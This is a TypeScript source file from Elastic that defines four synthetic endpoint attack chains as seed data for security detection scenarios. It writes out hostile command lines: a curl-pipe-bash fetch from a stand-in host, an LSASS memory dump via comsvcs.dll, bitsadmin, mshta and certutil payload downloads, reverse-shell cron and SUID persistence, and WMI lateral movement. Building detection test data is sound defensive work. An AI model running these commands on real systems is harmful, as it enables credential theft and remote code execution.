/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import type { Ad2ScenarioDefinition, Ad2ScenarioStep } from './types';

const step = (
  ruleName: string,
  severity: Ad2ScenarioStep['severity'],
  riskScore: number,
  message: string,
  processName: string | null,
  commandLine: string | null,
  eventType: Ad2ScenarioStep['eventType'],
  context: string | null
): Ad2ScenarioStep => ({
  ruleName,
  severity,
  riskScore,
  message,
  processName,
  commandLine,
  eventType,
  context,
});

/**
 * Clean profile: four endpoint attack chains with matching process, network, and file events.
 * Reimplemented from the portable AD2 seeder scenario catalog (not invoked at runtime).
 */
export const AD2_CLEAN_SCENARIOS = {
  'encoded-powershell': {
    key: 'encoded-powershell',
    title: 'Encoded PowerShell download cradle',
    host: 'wks-alice-01',
    os: 'windows',
    user: 'alice.chen',
    startHoursAgo: 2,
    raw: true,
    steps: [
      step(
        'Suspicious Microsoft Office Child Process',
        'high',
        73,
        'WINWORD.EXE spawned powershell.exe with an encoded command',
        'powershell.exe',
        'powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA',
        'process',
        null
      ),
      step(
        'Network Connection to Suspicious Domain',
        'high',
        78,
        'PowerShell connected to malicious-c2.example.com',
        'powershell.exe',
        'powershell.exe -EncodedCommand SQBFAFgA',
        'network',
        'malicious-c2.example.com'
      ),
      step(
        'Suspicious Registry Run Key Added',
        'high',
        82,
        'PowerShell created a Run key for update.ps1 persistence',
        'powershell.exe',
        'powershell.exe Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'file',
        'C:\\Users\\alice.chen\\AppData\\Roaming\\update.ps1'
      ),
      step(
        'Suspicious SMB Lateral Movement',
        'critical',
        91,
        'Compromised workstation accessed an administrative SMB share',
        'powershell.exe',
        'powershell.exe Copy-Item payload.exe \\\\srv-files-02\\ADMIN$',
        'network',
        'srv-files-02.contoso.local'
      ),
    ],
  },
  'bits-mshta': {
    key: 'bits-mshta',
    title: 'BITS and mshta LOLBin chain',
    host: 'wks-jordan-04',
    os: 'windows',
    user: 'jordan.park',
    startHoursAgo: 4,
    raw: true,
    steps: [
      step(
        'Suspicious Adobe Reader Child Process',
        'high',
        72,
        'AcroRd32.exe spawned bitsadmin.exe after a PDF was opened',
        'bitsadmin.exe',
        'bitsadmin /transfer updater https://cdn-fastupdate.example.net/a.hta C:\\ProgramData\\a.hta',
        'process',
        null
      ),
      step(
        'Suspicious HTTP Connection by mshta',
        'high',
        77,
        'mshta retrieved an HTA payload from a newly observed domain',
        'mshta.exe',
        'mshta.exe https://cdn-fastupdate.example.net/a.hta',
        'network',
        'cdn-fastupdate.example.net'
      ),
      step(
        'Scheduled Task Creation via schtasks',
        'high',
        83,
        'schtasks created UpdateCheck persistence for the downloaded payload',
        'schtasks.exe',
        'schtasks /create /tn UpdateCheck /tr C:\\ProgramData\\update.exe /sc onlogon',
        'file',
        'C:\\Windows\\System32\\Tasks\\UpdateCheck'
      ),
      step(
        'LSASS Memory Dump via comsvcs.dll',
        'critical',
        94,
        'rundll32 invoked MiniDump against LSASS',
        'rundll32.exe',
        'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 736 C:\\ProgramData\\lsass.dmp full',
        'file',
        'C:\\ProgramData\\lsass.dmp'
      ),
    ],
  },
  'linux-curl': {
    key: 'linux-curl',
    title: 'Linux nginx exploit to curl pipe bash and SUID persistence',
    host: 'web-prod-07',
    os: 'linux',
    user: 'www-data',
    startHoursAgo: 6,
    raw: true,
    steps: [
      step(
        'Suspicious Shell Spawned by Web Server',
        'high',
        75,
        'nginx worker spawned /bin/sh after an exploit request',
        'sh',
        '/bin/sh -c curl -fsSL https://drops.example.io/install.sh | bash',
        'process',
        null
      ),
      step(
        'Outbound Connection to Suspicious External Host',
        'high',
        81,
        'curl connected to drops.example.io from the nginx worker context',
        'curl',
        'curl -fsSL https://drops.example.io/install.sh',
        'network',
        'drops.example.io'
      ),
      step(
        'Cron Job Created by Non-Privileged User',
        'high',
        85,
        'www-data wrote a recurring reverse-shell cron entry',
        'bash',
        "bash -c echo '*/5 * * * * /tmp/.svc' > /var/spool/cron/www-data",
        'file',
        '/var/spool/cron/www-data'
      ),
      step(
        'SUID Bash Binary Created in /tmp',
        'critical',
        96,
        'A SUID copy of bash was created under /tmp',
        'chmod',
        'chmod 4755 /tmp/.bash-root',
        'file',
        '/tmp/.bash-root'
      ),
    ],
  },
  'wmi-lateral': {
    key: 'wmi-lateral',
    title: 'WMI lateral movement and subscription persistence',
    host: 'wks-karen-06',
    os: 'windows',
    user: 'karen.d',
    startHoursAgo: 8,
    raw: true,
    steps: [
      step(
        'Signed Installer Spawning Suspicious rundll32',
        'high',
        74,
        'msiexec spawned rundll32 with a remote scriptlet',
        'rundll32.exe',
        'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
        'process',
        null
      ),
      step(
        'Suspicious Certutil URL Cache Download',
        'high',
        80,
        'certutil downloaded a payload from an external update domain',
        'certutil.exe',
        'certutil -urlcache -split -f https://updates.legitimatesoft.example.com/a.exe C:\\ProgramData\\a.exe',
        'network',
        'updates.legitimatesoft.example.com'
      ),
      step(
        'WMI Event Subscription Persistence Created',
        'high',
        86,
        'A command-line consumer was bound to a WMI event filter',
        'wmic.exe',
        'wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE',
        'file',
        'C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA'
      ),
      step(
        'Remote Scheduled Task Creation via WMI',
        'critical',
        93,
        'WMI launched schtasks remotely on dc-fs-09',
        'wmic.exe',
        'wmic /node:dc-fs-09 process call create "schtasks /create /tn Updater /tr C:\\ProgramData\\a.exe /sc onstart"',
        'network',
        'dc-fs-09.contoso.local'
      ),
    ],
  },
} as const satisfies Record<string, Ad2ScenarioDefinition>;

export type Ad2CleanScenarioKey = keyof typeof AD2_CLEAN_SCENARIOS;

export const AD2_CLEAN_SCENARIO_KEYS = Object.keys(AD2_CLEAN_SCENARIOS) as Ad2CleanScenarioKey[];
